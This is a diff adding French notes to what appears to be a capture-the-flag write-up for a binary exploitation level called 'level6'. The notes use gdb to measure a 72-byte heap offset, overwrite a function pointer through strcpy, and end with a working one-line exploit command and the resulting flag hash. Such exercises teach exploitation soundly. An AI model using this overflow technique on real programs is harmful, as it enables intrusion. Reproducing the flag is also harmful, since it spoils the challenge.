@@ -63,7 +63,17 @@ on doit donc chercher le bon argument à envoyer
         0x08048466 <+18>:	leave  
         0x08048467 <+19>:	ret 
 
+La brèche ici est dans l'appel de strcpy on veut remplacer le pointeur sur m() par l'adresse de n en dépassant le buffer.
 
+Pour trouver l'offset on regarde alors les 2 pointeurs créé avec malloc stockés dans esp:
+> x/wx $esp+0x1c
+0xbffff71c:	0x0804a008
+> x/wx $esp+0x18
+0xbffff718:	0x0804a050
+
+0x804a050 - 0x804a008 = 0x48 = 72
+
+Et on ajoute l'adresse de n() en little-endian
 
 > ./level6 "$(python -c 'print "A"*72 + "\x54\x84\x04\x08"')"
 f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
